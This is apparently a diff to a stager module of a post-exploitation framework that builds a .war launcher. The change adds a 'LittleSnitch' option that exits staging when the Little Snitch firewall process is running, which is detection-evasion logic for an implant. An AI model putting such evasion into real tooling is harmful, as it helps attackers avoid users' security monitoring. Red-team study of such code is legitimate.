@@ -33,6 +33,11 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },
             'OutFile' : {
                 'Description'   :   'File to write .war to.',
                 'Required'      :   True,
@@ -73,13 +78,14 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
 
         # appName defaults to the listenername
         if appName == "":
             appName = listenerName
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, littlesnitch=LittleSnitch)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
